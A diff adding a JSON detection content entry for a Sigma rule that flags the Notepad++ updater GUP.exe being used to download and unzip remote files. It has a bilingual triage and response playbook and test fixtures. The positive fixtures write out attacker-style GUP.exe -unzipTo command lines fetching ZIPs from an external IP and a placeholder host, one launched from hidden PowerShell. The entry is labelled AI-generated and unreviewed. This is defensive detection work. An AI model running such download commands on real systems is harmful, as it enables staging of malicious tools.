@@ -1,0 +1,136 @@
+{
+  "rule": {
+    "id": "44143844-0631-49ab-97a0-96387d6b2d7c",
+    "title": "File Download Using Notepad++ GUP Utility",
+    "level": "high",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_gup_download.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_gup_download.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1105"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "El actualizador de Notepad++ (GUP.exe) se ejecutó con -unzipTo y una URL HTTP desde un proceso padre que no es notepad++.exe. Es probable que se esté usando como herramienta de descarga (LOLBin) para traer y descomprimir archivos remotos.",
+      "what_it_detects": "Eventos de creación de procesos en Windows donde Image termina en \\GUP.exe u OriginalFileName es gup.exe, y CommandLine contiene ' -unzipTo ' y 'http', excepto cuando ParentImage termina en \\notepad++.exe.",
+      "why_it_matters": "GUP es un binario firmado y confiable. Un atacante puede usarlo para descargar un ZIP desde un servidor externo y extraerlo en una carpeta local sin levantar sospechas. Esto corresponde a ATT&CK T1105 (Ingress Tool Transfer), que se usa para preparar payloads o herramientas de segunda etapa.",
+      "triage_steps": [
+        "Revise CommandLine: extraiga la URL, el dominio o IP y la carpeta de destino de -unzipTo. Si el host no es notepad-plus-plus.org o GitHub oficial, es sospechoso.",
+        "Identifique ParentImage y la línea de comandos del padre. Si el padre es cmd.exe, powershell.exe, wscript.exe, mshta.exe o Office, el riesgo es alto.",
+        "Revise Image: si GUP.exe está fuera de la carpeta de instalación de Notepad++ o está renombrado (solo coincide OriginalFileName), el riesgo aumenta.",
+        "Liste los archivos creados en la carpeta de destino y calcule su hash. Busque ejecutables, DLL o scripts.",
+        "Revise los procesos hijos y los procesos que se ejecutaron desde esa carpeta en el mismo host dentro de +/- 15 minutos.",
+        "Revise la telemetría de red y del proxy: busque conexiones al dominio o IP de la URL desde este y otros endpoints.",
+        "Busque alertas anteriores para el mismo usuario y host, sobre todo de acceso inicial o de ejecución de scripts."
+      ],
+      "false_positives": [
+        "Procesos padre legítimos no identificados que invocan GUP, como instaladores o wrappers de actualización de Notepad++.",
+        "Herramientas de despliegue de software (SCCM, Intune, scripts de TI) que ejecutan GUP directamente para actualizar Notepad++ desde la URL oficial."
+      ],
+      "response_steps": [
+        "Confirme con el usuario o con el equipo de TI si la ejecución estaba prevista. Valide la URL y el hash de los archivos descargados.",
+        "Si es maliciosa, aísle el endpoint y bloquee el dominio o IP de la URL en el proxy y el firewall.",
+        "Ponga en cuarentena los archivos extraídos y elimine los mecanismos de persistencia relacionados después de revisarlos.",
+        "Revise si otros hosts contactaron la misma URL, restablezca las credenciales comprometidas y documente los IOC."
+      ],
+      "severity_rationale": "El nivel high es apropiado porque, fuera de Notepad++, GUP casi nunca descarga ni extrae archivos remotos, y este uso indica con fuerza una transferencia de herramientas."
+    },
+    "en": {
+      "summary": "The Notepad++ updater (GUP.exe) ran with -unzipTo and an HTTP URL, and its parent process was not notepad++.exe. It is likely being abused as a download tool (LOLBin) to fetch and extract remote files.",
+      "what_it_detects": "Windows process creation events where Image ends with \\GUP.exe or OriginalFileName is gup.exe, and CommandLine contains ' -unzipTo ' and 'http', unless ParentImage ends with \\notepad++.exe.",
+      "why_it_matters": "GUP is a trusted, signed binary. An attacker can use it to download a ZIP from an external server and extract it locally without drawing attention. This maps to ATT&CK T1105 (Ingress Tool Transfer), which is used to stage payloads or second-stage tools.",
+      "triage_steps": [
+        "Read CommandLine: extract the URL, domain or IP, and the -unzipTo destination folder. Any host other than notepad-plus-plus.org or the official GitHub is suspicious.",
+        "Identify ParentImage and the parent's command line. A parent of cmd.exe, powershell.exe, wscript.exe, mshta.exe or an Office app means high risk.",
+        "Check Image: a GUP.exe outside the Notepad++ install folder, or a renamed copy that matched only on OriginalFileName, raises the risk.",
+        "List the files created in the destination folder and hash them. Look for executables, DLLs or scripts.",
+        "Review child processes and anything executed from that folder on the same host within +/- 15 minutes.",
+        "Check network and proxy telemetry for connections to the URL's domain or IP from this and other endpoints.",
+        "Look for earlier alerts for the same user and host, especially initial access or script execution alerts."
+      ],
+      "false_positives": [
+        "Legitimate parent processes not yet identified that call GUP, such as installers or Notepad++ update wrappers.",
+        "Software deployment tools (SCCM, Intune, IT scripts) that run GUP directly to update Notepad++ from the official URL."
+      ],
+      "response_steps": [
+        "Confirm with the user or IT whether the run was expected. Validate the URL and the hashes of the downloaded files.",
+        "If it is malicious, isolate the endpoint and block the URL's domain or IP at the proxy and firewall.",
+        "Quarantine the extracted files and remove related persistence after reviewing it.",
+        "Check whether other hosts contacted the same URL, reset compromised credentials and record the IOCs."
+      ],
+      "severity_rationale": "High fits because GUP rarely downloads or extracts remote archives outside Notepad++, so this usage strongly suggests tool transfer."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "GUP.exe launched by PowerShell to download a ZIP from an external IP and extract it into a public folder",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Program Files\\Notepad++\\updater\\GUP.exe",
+          "OriginalFileName": "gup.exe",
+          "CommandLine": "\"C:\\Program Files\\Notepad++\\updater\\GUP.exe\" -unzipTo C:\\Users\\Public\\cache http://203.0.113.45/files/update.zip",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentCommandLine": "powershell.exe -NoProfile -WindowStyle Hidden",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "Renamed GUP copy (matched on OriginalFileName) launched by cmd.exe and downloading over HTTPS",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mlopez",
+          "Image": "C:\\Users\\mlopez\\AppData\\Local\\Temp\\svcupd.exe",
+          "OriginalFileName": "gup.exe",
+          "CommandLine": "svcupd.exe -unzipTo C:\\Users\\mlopez\\AppData\\Local\\Temp\\x https://files.example.org/pkg.zip",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c start svcupd.exe",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate Notepad++ update: GUP.exe is launched by notepad++.exe, so the filter excludes it",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Program Files\\Notepad++\\updater\\GUP.exe",
+          "OriginalFileName": "gup.exe",
+          "CommandLine": "\"C:\\Program Files\\Notepad++\\updater\\GUP.exe\" -unzipTo C:\\Program Files\\Notepad++\\plugins\\NppExport https://github.com/example/nppexport/releases/download/v1/NppExport.zip",
+          "ParentImage": "C:\\Program Files\\Notepad++\\notepad++.exe",
+          "ParentCommandLine": "\"C:\\Program Files\\Notepad++\\notepad++.exe\"",
+          "IntegrityLevel": "High"
+        }
+      },
+      {
+        "description": "GUP.exe run from cmd.exe only to print its version: no -unzipTo and no URL, so selection_cli does not match",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0310.andes.example.com",
+          "User": "ANDES\\rgomez",
+          "Image": "C:\\Program Files\\Notepad++\\updater\\GUP.exe",
+          "OriginalFileName": "gup.exe",
+          "CommandLine": "\"C:\\Program Files\\Notepad++\\updater\\GUP.exe\" -v",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
